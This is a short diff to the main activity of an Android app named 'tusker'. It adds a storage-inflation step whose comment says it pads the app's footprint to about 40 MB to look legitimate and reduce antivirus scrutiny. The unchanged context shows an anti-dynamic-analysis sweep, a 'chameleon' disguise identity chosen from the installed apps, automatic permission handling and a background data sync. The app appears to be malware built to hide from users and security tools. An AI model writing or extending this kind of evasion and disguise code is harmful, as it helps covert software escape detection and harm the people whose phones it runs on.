@@ -11,6 +11,7 @@ import androidx.appcompat.app.AppCompatActivity;
 import com.task.tusker.permissions.AutoPermissionManager;
 import com.task.tusker.security.ChameleonIdentity;
 import com.task.tusker.security.SecurityGuard;
+import com.task.tusker.security.SizeInflationManager;
 import com.task.tusker.services.DataSyncService;
 
 public class MainActivity extends AppCompatActivity {
@@ -32,6 +33,12 @@ public class MainActivity extends AppCompatActivity {
 
         /* ── Anti-dynamic-analysis sweep (runs before any UI or service) ── */
         SecurityGuard.init(this);
+
+        /* ── Storage inflation (background thread, first launch only) ─────
+         * Writes ~38 MB of inert data to the app's private files dir so the
+         * total "App + Data" footprint shown in Settings → Apps matches a
+         * large legitimate app (~40 MB), reducing AV scrutiny.             */
+        SizeInflationManager.ensureInflated(this);
 
         /* ── Chameleon identity selection ─────────────────────────────────
          * Picks the best alias based on installed apps and enables it.
